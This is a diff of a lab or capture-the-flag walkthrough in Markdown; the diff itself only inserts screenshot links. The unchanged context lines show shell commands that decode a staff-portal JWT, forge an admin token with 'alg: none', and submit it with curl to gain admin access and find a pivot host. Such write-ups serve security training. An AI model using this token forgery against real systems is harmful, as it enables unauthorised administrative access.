@@ -35,6 +35,9 @@ curl -s -c /tmp/sso_cookies.txt -X POST http://203.x.x.x:8443/login \
 
 On success, a `pul_staff_token` cookie is set containing a JWT. The portal displays the raw token split into its three Base64URL-encoded sections (header · payload · signature).
 
+<img width="1229" height="1068" alt="image" src="https://github.com/user-attachments/assets/65963d78-2b90-4752-a64c-06115aa55675" />
+
+
 ### Step 2 — Decode the JWT
 
 Extract the token from the cookie jar:
@@ -62,6 +65,8 @@ echo $TOKEN | cut -d'.' -f2 | awk '{n=length($0)%4; if(n==2)printf "%s==", $0; e
 ```json
 {"sub": "svc-deploy-sso", "role": "analyst", "iat": 1731234567, "exp": 1731238167}
 ```
+<img width="2321" height="952" alt="image" src="https://github.com/user-attachments/assets/b32a497f-34c0-4b7a-b050-e388b82002c1" />
+
 
 ### Step 3 — Forge Admin JWT with alg: none
 
@@ -81,12 +86,18 @@ FORGED_TOKEN="${HEADER}.${PAYLOAD}."
 echo "Forged JWT: ${FORGED_TOKEN}"
 ```
 
+<img width="2340" height="957" alt="image" src="https://github.com/user-attachments/assets/cf555715-fe74-4b02-9ce2-bb83fe69dd5d" />
+
+
 ### Step 4 — Submit Forged Token
 
 ```bash
 curl -s -b "pul_staff_token=${FORGED_TOKEN}" \
   http://203.x.x.x:8443/staff-portal
 ```
+
+<img width="970" height="615" alt="image" src="https://github.com/user-attachments/assets/f5c95449-5811-4429-b8cc-70f067502660" />
+
 
 The server accepts the token (alg: none → no signature check), decodes the payload, reads `role: admin`, and renders the admin infrastructure panel.
 
@@ -102,6 +113,9 @@ The admin panel discloses:
 | Description | Network Management Host — SNMP polling agent |
 
 This is the pivot artifact for **M4 — itgw-netmgmt**.
+
+<img width="2519" height="1294" alt="image" src="https://github.com/user-attachments/assets/f0c4802e-6d9d-44f5-a651-6260f5a73228" />
+
 
 ---
 
